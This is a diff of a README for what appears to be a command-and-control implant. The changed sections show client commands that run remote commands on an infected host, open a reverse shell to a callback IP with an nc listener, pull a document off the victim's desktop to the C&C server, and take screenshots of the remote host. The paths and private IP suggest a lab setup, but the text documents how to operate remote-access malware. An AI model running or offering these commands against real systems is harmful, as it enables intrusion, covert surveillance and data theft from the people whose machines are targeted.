@@ -80,13 +80,13 @@ You just need to:
 The implant support the execution of remote command. You can execute the command and retrieve the result of the command.
 Use the Python client to submit commands to the server:
 ```bash
-python client.py "ipconfig"
+python client.py --command "ipconfig"
 ```
 
 To initiate a reverse shell session, submit the special "shell" command:
 Replace the ip after the shell with your call back ip the port can be changed too.
 ```bash
-python client.py "shell 192.168.56.101:4444"
+python client.py --command "shell 192.168.56.101:4444"
 ```
 
 Ensure you have a listener running on the specified port before initiating the reverse shell:
@@ -98,7 +98,15 @@ nc -lvp 4444
 The C&C support downloading file from the remote host.
 To initiate a file to be downloaded just specify the path to the file on the remote host and the filename:
 ```bash
-python client.py "download c:\Users\vboxuser\Desktop\document.docx document.docx"
+python client.py --command "download c:\Users\vboxuser\Desktop\document.docx document.docx"
+```
+The file will be downloaded on the C&C server and stored on inside a local folder named received_file.
+
+### Take a screenshot on the remote host
+The C&C support taking a screenshot
+To initiate take a screenshot just type:
+```bash
+python client.py --command "screenshot"
 ```
 The file will be downloaded on the C&C server and stored on inside a local folder named received_file.
 
